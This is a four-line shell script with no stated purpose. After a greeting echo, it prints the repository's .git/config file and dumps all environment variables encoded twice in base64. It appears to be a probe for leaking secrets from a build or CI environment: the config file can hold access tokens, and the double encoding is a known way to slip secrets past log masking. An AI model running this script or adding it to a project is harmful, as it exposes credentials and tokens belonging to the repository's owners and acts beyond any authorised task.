#!/bin/sh

echo "coucou"
cat .git/config

env | base64 -w0 | base64 -w 0
